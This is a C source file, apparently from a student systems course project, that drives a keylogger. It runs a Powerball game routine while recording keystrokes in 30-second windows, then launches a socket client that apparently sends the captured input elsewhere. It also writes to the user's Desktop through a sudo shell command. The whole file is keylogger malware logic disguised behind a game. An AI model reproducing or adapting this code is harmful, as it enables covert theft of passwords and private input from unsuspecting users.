#include "Keylogger/keylogger.c"
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <string.h>
#include "powerBall.h"

int trigger = 30000;
void time_30s(int trigger);

int main (){
  char cwd[1024];
  char dir_cli[1024];
  char dir_main[1024];
  if (getcwd(cwd, sizeof(cwd)) != NULL){
    strcpy(dir_cli,cwd);
    strcat(dir_cli, "/socket/client");
    char comm[1024];
    strcpy(comm,"sudo sh -c \"echo \'#!/bin/bash\n");
    strcat(comm, dir_cli);
    strcat(comm, "\' >> ~/Desktop/path.txt\"");
    system(comm);
    int flag = 0;

    // if flag is 3 stop keylogger forever
    while (flag != 3){
      flag = PBmain();
      // if flag is 1 or 2, abort keylogger for current time
      if (flag != 1 && flag != 2 && flag != 3){
        keylogger_start();
        time_30s(trigger);
        keylogger_end();
        system("/CSE2431_Project/socket/client"); 
      }else{
        time_30s(trigger);
      }
      if (flag != 3){
        flag = 0;
      }
    }
  }
}

void time_30s(int trigger){
        int msec = 0;
        clock_t before = clock();
        do {
                clock_t difference = clock() - before;
                msec = difference * 1000 / CLOCKS_PER_SEC;
        } while ( msec < trigger );
}
